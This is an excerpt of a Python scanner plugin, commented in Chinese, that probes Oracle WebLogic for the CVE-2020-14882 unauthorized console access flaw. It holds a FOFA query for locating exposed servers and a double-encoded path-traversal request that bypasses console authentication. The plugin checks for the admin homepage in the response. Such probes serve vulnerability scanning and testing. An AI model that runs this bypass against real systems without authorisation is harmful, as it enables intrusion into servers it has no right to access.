...
def vuln_info():
    info={
        'vuln_name': '未授权访问(CVE-2020-14882)',  #漏洞名称
        'vuln_referer':'无',  #漏洞来源
        'vuln_author':'未知',  #插件作者
        'cms_name':'Weblogic',#cms_name需要和上级目录保持一致。扫描器自动添加会调用。GUI版本不会调用
        'vuln_description':'''Weblogic控制台未授权访问''',
        'vuln_identifier':'''无''',
        ...
        'FofaQuery_rule':'title="Error 404--Not Found"',#header="JSESSIONID" || body="Struts Problem Report" || body="There is no Action mapped for namespace" || body="No result defined for action and result input" || header="Servlet" || header="JBoss",port="60001"
...
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    ...
    #Error_Info无论何时都会输出
        ...
        vuln_url = url + "/console/css/%252e%252e%252f/consolejndi.portal"
        
        # print(vuln_url)
        r = requests.get(vuln_url,headers=heads, verify=False,timeout=5)

        if '管理控制台主页'  in  r.text :
            result['Result']= True
